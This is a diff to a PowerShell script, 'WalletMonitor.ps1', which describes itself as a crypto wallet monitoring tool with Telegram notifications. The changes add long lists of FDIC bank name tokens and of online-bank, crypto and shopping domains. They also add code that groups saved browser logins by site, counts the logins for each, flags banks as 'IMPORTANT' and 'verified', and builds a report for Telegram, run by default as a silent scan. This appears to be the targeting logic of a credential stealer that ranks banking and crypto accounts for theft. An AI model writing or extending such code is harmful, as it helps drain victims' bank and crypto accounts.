@@ -1,6 +1,6 @@
 #Requires -Version 5.1
 <#
-    WalletMonitor.ps1  ::  v3.0  (Single File | no Python)
+    WalletMonitor.ps1  ::  v3.1  (Single File | no Python)
     ==================================================================
     Crypto wallet artifact monitoring tool for your machine (Windows) + Telegram notifications.
 
@@ -201,7 +201,7 @@ $WALLETS = @{
     wallet_domains = @(
         'metamask.io', 'phantom.app', 'phantom.com', 'trustwallet.com', 'rabby.io',
         'keplr.app', 'solflare.com', 'ledger.com', 'trezor.io', 'exodus.com',
-        'electrum.org', 'wasabiwallet.io', 'sparrowwallet.com', 'coinbase.com',
+        'electrum.org', 'wasabiwallet.io', 'sparrowwallet.com', 'blockchain.com',
         'base.org', 'backpack.app', 'onekey.so', 'safepal.com', 'tokenpocket.pro',
         'mathwallet.org', 'coin98.com', 'imtoken.org'
     )
@@ -269,6 +269,305 @@ $WALLETS = @{
         'wallet', 'metamask', 'binance', 'coinbase', 'kraken', 'uniswap',
         'opensea', 'airdrop', 'seed phrase', 'private key', 'mnemonic'
     )
+}
+
+# =====================================================================
+#  2b)  Verified lists (FDIC banks, online banks, crypto platforms, shopping)
+#       Generated from the official FDIC bank list, a verified online-bank
+#       list and a verified crypto-platform list. A saved-login site that
+#       matches one of these is reported as a *verified* bank / platform, and
+#       banks found here are flagged IMPORTANT in the report.
+# =====================================================================
+
+$Script:VerifiedRaw = @{
+    FdicBankTokens = @'
+2unifi 5star abacus abbeville abbybank absecon adams adelphi adirondack adrian
+agility aitkin alamosa alapaha albank albans albin albion alden alerus
+aliceville allen allendale alliant allnations alpine altamaha alton altoona altos
+amalgamated amarillo ambler amboy amerant amerasia america american americana americans
+americas americus amerifirst ameriprise ameris ameriserv ameristate amherst amistad amory
+anahuac anderson andes andover andrew andrews androscoggin angelina angola anguilla
+ansgar anson anstaff antwerp appleton appomattox arbor arcadian ardmore arenzville
+argentine arlington armed armor armstrong aroostook arrowhead arthur artisans arundel
+arvest ascend ascendia ascent ashland ashton asian aspermont aspire associated
+association assumption astra atascosa atkins atlanta auburn auburnbank audubon austin
+availa avana avidbank avidia axiom b1bank badger bagley baker balboa
+baldwin ballinger ballston baltic banccorp bancfirst banco bancorporation bandera banesco
+bangor bank19 bank3 bank360 bank419 bank47 bankcda bankcentre bankchampaign bankcherokee
+banker bankers bankersbank bankfirst bankflorida bankgloucester bankiowa bankmiami banknewport banknorth
+bankokolona bankorion bankpacific bankplus banksouth bankstar banktennessee bankunited bankvista bankwell
+bankwest banner bannon banterra baraboo barclays baroda barrington bartlett barwick
+basile bastrop battle baxter baybank baycoast bayfirst bayvanguard beach bearden
+beardstown beauregard beaver bedford bedias beecher belgrade belle belleville bellevue
+bellingham belmont bement bemidji bendena beneficial bennington benton berkshire berlin
+berne bessemer bethany better beverly biddeford bigfork billings biloxi bippus
+bison black blackhawk blacksburg blakely blanchester blissfield bloomfield bloomsdale bluegrass
+blueharbor bluestone bluff bluffton bodcaw boelus bogota bonanza bonduel bonneville
+bonvenu boone boonville border bosque botetourt bottineau bourbonnais bowes boyer
+boynton bozeman bradesco bradford brady branch brannen branson brantley brasil
+brattleboro bravera brazos breda bremen brenham brentwood brewton brickyard bridger
+bridgewater brighton bristol broadstreet broadway brodhead broken brookfield brookhaven brooks
+brooksville brookville brothers brownsboro brownstown brownwood bruning brunswick brush bryant
+buckeye buckholts buckley bucklin bucyrus buena buffalo building builtwell bureau
+burke burleson burling burnet burnie burrton busey bushnell business butte
+byline byron c3bank cache cadiz cahawba caldwell calhan calhoun callaway
+calprivate calvin cambridge camden cameron camilla campbell campton campus canal
+canandaigua canby canfield canonsburg canton capitol capon capra captiva carlisle
+carmel carmi carmine carolinas carroll carrollton carson carter carthage carver
+casey cashmere cashton castle castroville catalyst cathay cattaraugus cattle cattlemens
+cayuga ccfbank cecilian cedar cedars celeste celtic cendera cenlar centennial
+centera centier centinel central centrebank centreville cents century cerescobank cfbank
+cfsbank chambers chambersburg champaign champion champlain chandler charles charleston charlevoix
+charlotte charter chartered chase chatsworth cheboygan checotah chelsea chemung cheney
+cherokee cherry chesapeake chester chesterfield chicago chickasaw chillicothe chilton china
+chino chippewa choice choiceone chunk ciera cimarron cincinnatus citibank cities
+civista clackamas clair clare claremont clarendon clarion clarke clarks clarksdale
+clarkson classic claxton clear cleveland climate clinton clovis coast coastal
+cochran coffee cogent cokato colby coldspring coleman coleraine colfax collins
+collinsville colonial colony columbus column comenity command commencement commerceone commonwealth
+compass concorde concordia conemaugh conneaut connect connection connections connectone conservation
+constitution consumers continental converse conway cooper cooperative cooperativo copiah corbin
+corebank corefirst corner corners cornhusker correspondent cortez cortrust corydon cottonport
+cottonwood cotulla coulee counties country countryside countybank coushatta covington cowboy
+coweta craft craig crawford creek crescent crest crews crocker crockett
+croghan crosbyton cross crossbridge crosse crossroads crowell crown cruces crystal
+cullman cumberland currency currie custer customers cypress dacotah dairy dalhart
+dallas danville davidson davis dawson dayspring dearborn decatur decorah dedham
+dedicated deere deerfield deerwood defiance dekalb delhi delight dells demotte
+denali denison dennison denver deposit dequeen deridder desjardins desoto deutsche
+devon dewey dewitt dexter diamond dickinson dickson diego dieterich dighton
+discount district dixon dolores dominion dongola donley dorado douglas dozier
+drake dream drovers dryden dublin dudley dundee durden dysart eagle
+eaglebank eaglemark earlham earth eastbank eastern easton eaton echelon eclipse
+edina edinburg edison edmond edmonson edmonton edward edwards elderton eldon
+electronic elevate elgin elizabethton elkhorn elkton ellsworth elmer elmhurst elysian
+embassy emden emigrant emprise encore endeavor england enterprise entrebank ephrata
+equitable equity erath erebor esquire essex estes eufaula eureka evabank
+evangeline evans evant eveleth everbank everence everest everett evergreen evermore
+evertrust evolve exchange express extraco factors fahey fairfax fairfield fairmont
+fairmount fairview falcon falfurrias fallon falls family fannin fargo faribault
+farmbank farmington fayette fayetteville federated federation feliciana fetter fidelity fieldpoint
+fifth finwise firstar firstbank firstier firstoak firstrust firststate fisher flagship
+flagstar flanagan flatirons flatwater fleetwood fleming fletcher flint flora florence
+focus forbright forces forcht foresight forest forrest forsyth forte fortifi
+fortis fortress fortuna forward foundation founders fountain fowler francisco francisville
+frandsen frankewing frankfort franklin frazer frederick fredonia freedombank freeport fremont
+french friend friendship frontier frost fullerton fulton fusion fvcbank fwbank
+gaffney gainey galion garden garfield garrett gateway gbank geddes generations
+genesee genesis geneva genoa genubank gerber german germantown gibsland giddings
+gilbert gillette gilmer girard glacier glade glarus gleason glennville glenwood
+global glory gnbank golden goldman goldwater golva gonvick goodfield goose
+goppert gordon gouverneur graceville graham grain grainger granbury grand grandin
+grandview granger granite grant granville grass grasshopper graymont grayson great
+greatamerica greater greeley greeleyville green greene greeneville greenfield greenleaf greensboro
+greensburg greenville greenway greenwich griffin grinnell groton grove growers grundy
+grygla guadalupe guaranty guardian gueydan gulfside gunnison guthrie habib haddon
+hallettsville halls halstead hamel hamilton hamler hamlin hammond hampshire hampton
+hancock hanmi hanover hapoalim happen harbor hardin harford harleysville harmony
+harris harrison hartford hartington hartsburg harvard harvest harvey haskell hastings
+hatboro hatch havana haven haverford haverhill hawaiian hawthorn hazelton hazen
+hazlehurst headwaters healy hearthside hebbronville hebron hegewisch henderson hendricks henry
+herbert hereford herrin herring hershey hertford hiawatha hibbing hibernia hickory
+hicksville highland highlands highpoint hills hillsboro hilltop hindman hingham hinsdale
+hocking hodge hodgenville hoffman holcomb holland holly holyrood homebank homeland
+homepride homestead hometown hometrust homewood hominy honesdale honor hooker hoosier
+hopeton horatio horicon horizon houghton houston howard hoyne hughes huntingdon
+huntington huntsville huron hustisford huston hutchinson hutsonville hyden hydro hyperion
+iberia idabel ignace illini impact inbank incommons incorporated increase incrediblebank
+independence india indianapolis industrial industry infinity infirst innovations insbank insouth
+institution integrity integro interamerican interaudi interbank international internet interstate intracoastal
+intrust investar investment investors inwood ipava ipswich ireland iroquois irvine
+irvington isabella israel itasca ixonia izard jacinto jacksboro jackson jacksonville
+james jamestown janesville jarrettsville jeanerette jeffers jefferson jennings jewett johns
+johnson jonah jones jonesboro jonesburg jonestown journey jpmorgan junction juniata
+junta kalamazoo kalispell kampsville kankakee karnes katahdin kaukauna kearny kendall
+kenmare kennebec kennebunk kennett kensington kentland kenton kenyon kerndt kewanee
+keybank keysavings keystone killbuck kilmichael kindred kingston kingstree kinmundy kirkpatrick
+kirkwood kleberg kodabank kress labette labor lacon ladysmith lafayette lafourche
+lakes lakeside lakeview lakewood lakota lamar lamesa lamont lancaster landisburg
+landmark landry lankin laona latimer lauderdale lavaca lawrence lawrenceburg lawton
+leader lebanon ledyard legacy legence legend legends lehigh leighton lewisburg
+lexicon lexington libertyville lifestore limited lincoln lincolnton lindell lindsay lineage
+lipan lisle litchfield little littlefield livingston llano local locality lockhart
+locus lodge logan logansport lohman longview lorain louis louisburg lovelady
+lowcountry lowell lowry loyal luana luling lumbee luminate lusitania luxemburg
+lyndon lyons lytle mabrey macatawa machias macon madison madrid magnolia
+magyar mainstreet malaga malta malvern management manasquan manchester manhattan manistique
+mankato manning manubank manufacturers maple maplemark maquoketa marais marathon marblehead
+maria marie maries marin marine marion market marlow marquette marseilles
+marshall martha martin martinsville mascoma mascoutah mason maspeth massena massmutual
+mauch mauston maverick maxwell maynard maysville mayville mcalester mcbank mcclain
+mcclave mcconnelsville mccook mccurtain mcgregor mcintosh mckinley mcminnville meade meadow
+meadows mechanics medallion mediapolis medora mellon members memphis menard mendocino
+mercantile mercer meredith meridian merit merrick merrimack mertzon metairie method
+methuen metro metropolis metropolitan miami micronesia midamerica midcountry middle middlebury
+middlesex middletown midfirst midland midsouth midstates midwest milaca milan milestone
+milford millbrook millbury milledgeville millennial millennium millersburg mills millville millyard
+milton minden miners minnstar minnwest minster mission mitsui mizrahi mizuho
+modern mohall momentum monet moniteau monmouth monroe monson montecito monterey
+montezuma montgomery monticello montrose monument moody moose morgan morganton morgantown
+mortgage morton moultrie mound moundville mount mountain mountainone mountains movement
+muenster municipal munising murphy murphysboro murray mutualone nantahala napoleon nashville
+natbank natchitoches nation nations nationwide native naturalstate nauvoo nebraskaland needham
+neffs neighbor neighborhood neighbors nekoosa nelnet newbank newburg newburyport newfield
+newfirst newington newport newtek newton newtown nexbank nextier nicolet niles
+ninnescah noblebank nodaway nokomis normangee norte north northbrook northeast northern
+northfield northpointe northrim northstar northview northwest northwestern northwoods norway norwood
+oakley oakstar oakwood oakworth ocean oceanfirst oconee odessa oelwein ohnward
+okarche okawville oklee olmsted olney olympia omaha oneida onelocal oneunited
+ontario oostburg operative opportunity optimumbank option optum optus orange orbisonia
+orient oriental origin orrstown orwell osakis osceola osgood ottoville ottumwa
+ouray outdoor overbrook owasso owatonna owingsville oxford ozark ozarks ozona
+pactual padre paducah palmetto pandora panhandle paper paradise paragon paramount
+paris parish parke parkersburg parkside parkway partners pasco passumpsic pathfinder
+pathward pathway patriot patriots patrons patterson pauls pavillion payne peapack
+pearl pecos pegasus pendleton peninsula penncrest pennian pennsville pensacola pentucket
+peoplefirst peoplesbank peoplessouth peoplestrust perennial perry perryton personal peshtigo petefish
+peter peterstown petit phelps phenix philadelphia philip philo phoenixville pibank
+picayune pickens pickett piedmont piermont pierz pikes pilgrim pillar pilot
+pinckneyville pineland pineries pinnacle piscataqua pitney pittsfield plain plains plainscapital
+plainview plank planters plaquemine platinum platte pleasant pleasants plumas pocahontas
+point pointbank pointe points pointwest ponce pontiac poppy popular portage
+porter portrait potomac powell prague prairie preferred premier premierbank presidential
+prevail pride primary prime primebank primesouth primghar primis princeton princeville
+principal prinsbank priority priorityone prism private proctor produce producer producers
+profile profinium progressive progrowth promiseone prospect prosperity protection providence provident
+pryority puerto pulaski purdin putnam pyramax quail quaint queensborough queenstown
+quill quitaque quitman quoin quontic rabun raccoon rafael randall randolph
+range ransom rantoul rapids raritan ravenswood raymond raymore rayne reading
+readlyn redemption redstone redwood reeseville regal regent region regions reliabank
+reliance relyance renasant republic resource rhinebeck richland richmond richmondville richton
+richwood riddell ridge ridgewood riley river riverbank riverhills rivers riverside
+riverstone riverview riverwind riviera robert robertson robinson rochelle rockies rockland
+rockpointbank rocky rogersville rolette rolling rollstone romney ronan rondout roosevelt
+roscoe roseau rosedale rosemount rouge round roundup roxboro royal rushford
+rushville russell sabine sachs sacramento safra sainte salem salina salle
+sallie salyersville samson sanborn sandhills sandusky sanger sanibel santa santander
+savannah savers sawyer scale schaller schaumburg schertz schuyler schwab scotia
+scott scottsburg scottsdale scribner seacoast seamen seattle secure seiling select
+seneca sentinel sentry servbank servisfirst settlers sewickley seymour shamrock shannon
+sharon shelby shell sherburne sherwood shinhan shore shoreham sibley sicily
+sidney sierra signature silex silver simmesport simmons sioux siouxland skiles
+skowhegan skyline sleepy sloan slovenian smackover smartbank smartbiz smith society
+solera solomon solon solutions solvay somerset somerville sonata sonora sooner
+sound source south southeast southeastern southern southerntrust southpoint southside southstar
+southstate southtrust southwest southwestern southwind sovereign sparta spearville spectra spencer
+spirit spiritbank spratt spring springfield springs square stafford stanley stanton
+starion statebank states stearns steeleville steinauer stephenson sterling stifel stillman
+stitch stockgrowers stockman stockmens stockton stone stonehambank storm story stoughton
+strasburg streator street stride stronghurst stryv studio sturdy sturgis success
+sugar sullivan sulphur sumitomo summit sundance sundown sunflower sunmark sunnyside
+sunrise sunset sunstate sunwest superior surety susser sutton swainsboro swanville
+swedish sweet sycamore synchrony synergy table talbot tammany tampa tanager
+tarboro taunton taylor taylorsville taylorville tecumseh tefahot temple templeton tensas
+terrabank tescott teutopolis texana texarkana texasbank texoma thayer thief think
+thomas thomaston thomasville thorntown thorpe thread three thrift thrivent thumb
+tigerton timber timberland timberline tioga titan tnbank today toledo tolleson
+tompkins torrington touchmark toulon tower townebank toyota traders tradition traditional
+traditions trail trailwest transact transpecos transportation travelers tremont triad tricentury
+trimont trinidad trinity tripoli tristar tristate triumph trubank trucommunity truist
+trunorth trupoint trustar trustbank trustco trustmark trusttexas truxton tucumcari turbotville
+turtle turton tustin ubank ulster ultima underwood unibank unico unified
+unison unity universal university univest upper upstate urbana utica uvalde
+uwharrie valdosta vallant valley valliance valor valuebank vantage vegas velva
+ventura verabank vergas verimore vermilion vermillion vernon versabank versailles verus
+vicinity victory vidalia viking villa village vineyard vintage vinton vision
+visionbank vista vivian volunteer wadena waggoner wagner wahoo wakefield walden
+waldo walker wallis wallkill walpole walters walton wanamingo wanda wapakoneta
+warren warrington warroad warsaw warthen washita water waterfall waterford waterloo
+waterman watermark waterstone watertown watkins watseka wauchula waukesha waukon waumandee
+waupaca waurika waverly waycross wayne waynesboro waypoint wealth weatherford webbank
+webster welch welcome wellington wells wellworth wesbanco westamerica westbury westerly
+western westfield westmoreland weston westroads westside weststar wheaton wheeler whitaker
+white whitesville whitney whittier whittington wichita wiggins willamette willards williamson
+williamstown williamsville williston wilmington wilson winchester windsor winfield winnebago winnfield
+winnsboro winona winter wintrust wisdom wolcott woodford woodforest woodland woodlands
+woodruff woodsboro woodsfield woodtrust woori workers world worthington wrentham wyaconda
+wynnewood xenia yakima yampa yards yates yazoo yellowstone yoakum young
+zachary zavala zenith zions
+'@
+    OnlineBankDomains = @'
+albert.com ally.com americanexpress.com axosbank.com bankpurely.com baskbank.com betterment.com bluevine.com
+bmo.com breadfinancial.com brex.com cash.app cfg.bank chime.com cit.com citizensaccess.com
+crossriver.com current.com dave.com empower.me everbank.com ffb.com fidelity.com firstinternetbank.com
+found.com go2bank.com grasshopper.bank greenlight.com laurelroad.com lendingclub.com lili.co liveoakbank.com
+m1.com marcus.com mercury.com nbkc.com novo.co one.app oxygen.us piere.com
+popular.com public.com quontic.com ramp.com relayfi.com revolut.com rho.co robinhood.com
+salemfive.com salliemae.com sofi.com stash.com step.com synchrony.com tabbank.com ufbdirect.com
+varomoney.com venmo.com wealthfront.com
+'@
+    CryptoWalletDomains = @'
+anchorage.com argent.xyz backpack.exchange bitbox.swiss bitcoin.org blockstream.com bluewallet.io coldcard.com
+dcentwallet.com electrum.org ellipal.com exodus.com foundationdevices.com gridplus.io keepkey.com keyst.one
+ledger.com metamask.io myetherwallet.com ngrave.io onekey.so phantom.com rabby.io rainbow.me
+safe.global safepal.com secuxtech.com solflare.com sparrowwallet.com tangem.com trezor.io trustwallet.com
+uniswap.org wasabiwallet.io zerion.io
+'@
+    CryptoExchangeDomains = @'
+banxa.com binance.us bitflyer.com bitpay.com bitstamp.net cash.app cex.io coinbase.com
+coinzoom.com crypto.com etoro.com fidelity.com foldapp.com gemini.com interactivebrokers.com kraken.com
+lolli.com moonpay.com paypal.com public.com ramp.network robinhood.com sofi.com transak.com
+uphold.com venmo.com webull.com
+'@
+    CryptoOtherDomains = @'
+bitgo.com bitwiseinvestments.com circle.com copper.co falconx.io fidelitydigitalassets.com fireblocks.com hiddenroad.com
+paxos.com talos.com zerohash.com
+'@
+    ShoppingDomains = @'
+ajio.com alibaba.com aliexpress.com amazon.ae amazon.ca amazon.co.uk amazon.com amazon.com.au
+amazon.com.tr amazon.de amazon.eg amazon.es amazon.fr amazon.in amazon.it amazon.sa
+asos.com banggood.com bestbuy.com cartlow.com costco.com dhgate.com dubizzle.com ebay.co.uk
+ebay.com ebay.de etsy.com flipkart.com hm.com homedepot.com ikea.com jumia.com
+jumia.com.eg jumia.com.ng lazada.com.sg lowes.com mercadolibre.com myntra.com namshi.com newegg.com
+noon.com olx.com olx.com.eg overstock.com poshmark.com samsclub.com shein.com shopee.com
+shopify.com snapdeal.com souq.com stockx.com target.com temu.com walmart.com wayfair.com
+wish.com zara.com
+'@
+}
+
+function Get-VerifiedLists {
+    <# Splits the embedded verified lists once and caches the result. #>
+    if ($Script:VerifiedLists) { return $Script:VerifiedLists }
+    function Split-Words([string]$s) {
+        return [string[]](@($s -split '\s+') | Where-Object { -not [string]::IsNullOrWhiteSpace($_) })
+    }
+    $Script:VerifiedLists = [PSCustomObject]@{
+        FdicTokens        = Split-Words $Script:VerifiedRaw.FdicBankTokens
+        BankDomains       = Split-Words $Script:VerifiedRaw.OnlineBankDomains
+        CryptoWallets     = Split-Words $Script:VerifiedRaw.CryptoWalletDomains
+        CryptoExchanges   = Split-Words $Script:VerifiedRaw.CryptoExchangeDomains
+        CryptoOther       = Split-Words $Script:VerifiedRaw.CryptoOtherDomains
+        ShoppingDomains   = Split-Words $Script:VerifiedRaw.ShoppingDomains
+    }
+    return $Script:VerifiedLists
+}
+
+function Test-HostTokenMatch {
+    <# True when the host name starts with (or has a dot/dash right before) one of
+       the distinctive FDIC bank name tokens. The token must NOT sit in the middle
+       of a longer word, so e.g. the bank token "chain" does not match
+       "blockchain.com" while "northrim.com" still matches. #>
+    param([string]$HostName, [string[]]$Tokens)
+    if ([string]::IsNullOrWhiteSpace($HostName)) { return $false }
+    $low = $HostName.ToLowerInvariant()
+    foreach ($t in $Tokens) {
+        $i = $low.IndexOf($t, [System.StringComparison]::Ordinal)
+        while ($i -ge 0) {
+            if ($i -eq 0 -or -not [char]::IsLetterOrDigit($low[$i - 1])) { return $true }
+            $i = $low.IndexOf($t, ($i + $t.Length), [System.StringComparison]::Ordinal)
+        }
+    }
+    return $false
+}
+
+function Test-VerifiedBankHost {
+    <# True when the site is a verified bank: it is in the verified online-bank
+       domain list or its host matches a distinctive FDIC institution name token. #>
+    param([string]$HostName)
+    if ([string]::IsNullOrWhiteSpace($HostName)) { return $false }
+    $vl = Get-VerifiedLists
+    if (Test-DomainMatch -HostName $HostName -Domains $vl.BankDomains) { return $true }
+    return (Test-HostTokenMatch -HostName $HostName -Tokens $vl.FdicTokens)
 }
 
 # =====================================================================
@@ -1525,17 +1824,29 @@ function Get-CategoryMeta {
 }
 
 function Get-LoginCategory {
-    <# Classifies a saved-login site: banks/payments first, then crypto wallets,
-       exchanges, dApps, general crypto sites; host-name banking keywords are a
-       last-resort heuristic before falling back to 'other'. #>
+    <# Classifies a saved-login site: banks/payments first (config list, then the
+       verified online-bank domain list, then distinctive FDIC institution name
+       tokens), then dApps, then crypto exchanges and wallets (config lists + the
+       verified crypto-platform lists; exchanges are checked before wallets so
+       multi-product platforms such as coinbase.com classify as exchanges), then
+       other crypto platforms, shopping/retail, and crypto keywords; host-name
+       banking keywords are a last-resort heuristic before 'other'. #>
     param([string]$Url)
     $host_ = Get-UrlHost $Url
     if ([string]::IsNullOrWhiteSpace($host_)) { return 'other' }
 
     if (Test-DomainMatch -HostName $host_ -Domains @(Get-Prop $Script:Wallets 'bank_domains' @())) { return 'bank' }
-    if (Test-DomainMatch -HostName $host_ -Domains @(Get-Prop $Script:Wallets 'wallet_domains' @())) { return 'wallet' }
-    if (Test-DomainMatch -HostName $host_ -Domains @(Get-Prop $Script:Wallets 'exchanges_domains' @())) { return 'exchange' }
+    $vl = Get-VerifiedLists
+    if (Test-DomainMatch -HostName $host_ -Domains $vl.BankDomains) { return 'bank' }
+    if (Test-HostTokenMatch -HostName $host_ -Tokens $vl.FdicTokens) { return 'bank' }
+
     if (Test-DomainMatch -HostName $host_ -Domains @(Get-Prop $Script:Wallets 'dapp_domains' @())) { return 'dapp' }
+    if (Test-DomainMatch -HostName $host_ -Domains @(Get-Prop $Script:Wallets 'exchanges_domains' @())) { return 'exchange' }
+    if (Test-DomainMatch -HostName $host_ -Domains $vl.CryptoExchanges) { return 'exchange' }
+    if (Test-DomainMatch -HostName $host_ -Domains @(Get-Prop $Script:Wallets 'wallet_domains' @())) { return 'wallet' }
+    if (Test-DomainMatch -HostName $host_ -Domains $vl.CryptoWallets) { return 'wallet' }
+    if (Test-DomainMatch -HostName $host_ -Domains $vl.CryptoOther) { return 'crypto' }
+    if (Test-DomainMatch -HostName $host_ -Domains $vl.ShoppingDomains) { return 'shopping' }
     if (Test-CryptoKeyword -Text $host_) { return 'crypto' }
 
     $low = $host_.ToLowerInvariant()
@@ -1548,15 +1859,18 @@ function Get-LoginCategory {
 }
 
 function Get-LoginCategoryMeta {
-    <# Display metadata (icon + title) for the saved-login categories - banks first. #>
+    <# Display metadata (icon + title) for the saved-login categories - banks first
+       (they are flagged IMPORTANT in the report), then wallets, exchanges,
+       shopping, dApps, crypto and other. #>
     param([string]$Category)
     switch ($Category) {
         'bank'     { return @{ Order = 1; Icon = '🏨'; Title = 'Banks & payments' } }
         'wallet'   { return @{ Order = 2; Icon = '🟣'; Title = 'Crypto wallets' } }
         'exchange' { return @{ Order = 3; Icon = '🟠'; Title = 'Exchanges' } }
-        'dapp'     { return @{ Order = 4; Icon = '🔵'; Title = 'DApps' } }
-        'crypto'   { return @{ Order = 5; Icon = '🟡'; Title = 'Crypto sites' } }
-        default    { return @{ Order = 6; Icon = '⚪'; Title = 'Other' } }
+        'shopping' { return @{ Order = 4; Icon = '🛍️'; Title = 'Shopping & retail' } }
+        'dapp'     { return @{ Order = 5; Icon = '🔵'; Title = 'DApps' } }
+        'crypto'   { return @{ Order = 6; Icon = '🟡'; Title = 'Crypto sites' } }
+        default    { return @{ Order = 7; Icon = '⚪'; Title = 'Other' } }
     }
 }
 
@@ -2126,10 +2440,14 @@ function Build-LoginReportLines {
         $key = $h
         if ($key.StartsWith('www.')) { $key = $key.Substring(4) }
         if (-not $sites.ContainsKey($key)) {
+            $cat = Get-LoginCategory -Url $u
+            $vbk = $false
+            if ($cat -eq 'bank') { $vbk = Test-VerifiedBankHost -HostName $key }
             $sites[$key] = [PSCustomObject]@{
                 Host     = $key
                 Urls     = (New-Object System.Collections.ArrayList)
-                Category = (Get-LoginCategory -Url $u)
+                Category = $cat
+                Verified = $vbk
             }
         }
         [void]$sites[$key].Urls.Add(([string]$u))
@@ -2147,13 +2465,20 @@ function Build-LoginReportLines {
     }
 
     $siteList = @($sites.Values)
-    $catOrder = @('bank', 'wallet', 'exchange', 'dapp', 'crypto', 'other')
-    $catNames = @{ bank = 'banks'; wallet = 'wallets'; exchange = 'exchanges'; dapp = 'dApps'; crypto = 'crypto'; other = 'other' }
+    $catOrder = @('bank', 'wallet', 'exchange', 'shopping', 'dapp', 'crypto', 'other')
+    $catNames = @{ bank = 'banks'; wallet = 'wallets'; exchange = 'exchanges'; shopping = 'shopping'; dapp = 'dApps'; crypto = 'crypto'; other = 'other' }
 
     $catSummary = New-Object System.Collections.ArrayList
     foreach ($c in $catOrder) {
-        $n = @($siteList | Where-Object { $_.Category -eq $c }).Count
-        if ($n -gt 0) { [void]$catSummary.Add(("{0}: <b>{1}</b>" -f $catNames[$c], $n)) }
+        $inCat = @($siteList | Where-Object { $_.Category -eq $c })
+        if ($inCat.Count -eq 0) { continue }
+        if ($c -eq 'bank') {
+            $vb = @($inCat | Where-Object { $_.Verified }).Count
+            if ($vb -gt 0) { [void]$catSummary.Add(("banks: <b>{0}</b> (⭐ {1} verified)" -f $inCat.Count, $vb)) }
+            else { [void]$catSummary.Add(("banks: <b>{0}</b>" -f $inCat.Count)) }
+        } else {
+            [void]$catSummary.Add(("{0}: <b>{1}</b>" -f $catNames[$c], $inCat.Count))
+        }
     }
 
     [void]$lines.Add('')
@@ -2176,12 +2501,16 @@ function Build-LoginReportLines {
         $meta = Get-LoginCategoryMeta $c
         [void]$lines.Add('')
         [void]$lines.Add('━━━━━━━━━━━━━━')
-        [void]$lines.Add("$($meta.Icon) <b>$($meta.Title)</b> - $($inCat.Count) site(s)")
+        $imp = ''
+        if ($c -eq 'bank') { $imp = ' ⭐ <b>IMPORTANT</b>' }
+        [void]$lines.Add("$($meta.Icon) <b>$($meta.Title)</b>$imp - $($inCat.Count) site(s)")
         foreach ($site in $inCat) {
             if ($shown -ge $maxUrls) { $truncated = $true; break }
             $cnt = 0
             if ($siteCnts.ContainsKey($site.Host)) { $cnt = [int]$siteCnts[$site.Host] }
-            [void]$lines.Add("   • $(ConvertTo-HtmlSafe $site.Host) — <b>$cnt</b> login(s)")
+            $ver = ''
+            if ($c -eq 'bank' -and $site.Verified) { $ver = ' ✔ <i>verified bank</i>' }
+            [void]$lines.Add("   • $(ConvertTo-HtmlSafe $site.Host) — <b>$cnt</b> login(s)$ver")
             $n = 0
             foreach ($su in @($site.Urls)) {
                 if ($n -ge 2 -or $shown -ge $maxUrls) { break }
@@ -3036,7 +3365,7 @@ $hostLabelCfg = [string](Get-Prop $Script:Cfg 'host_label' '')
 if ($hostLabelCfg) { $Script:HostLabel = $hostLabelCfg }
 
 if ($Help) {
-    Write-Console 'WalletMonitor v3.0 — crypto wallet artifact monitoring (single file, no Python)' 'Cyan'
+    Write-Console 'WalletMonitor v3.1 — crypto wallet artifact monitoring (single file, no Python)' 'Cyan'
     Write-Console ''
     Write-Console '  (no switches)    one silent scan + Telegram notifications'
     Write-Console '  -Console         show output on screen'
@@ -3110,7 +3439,7 @@ if ($Install) {
 
 Initialize-Log
 Rotate-LogIfNeeded
-Write-Log '################ WalletMonitor v3.0 (single file, no Python) ################'
+Write-Log '################ WalletMonitor v3.1 (single file, no Python) ################'
 
 Initialize-Telegram
 Initialize-State
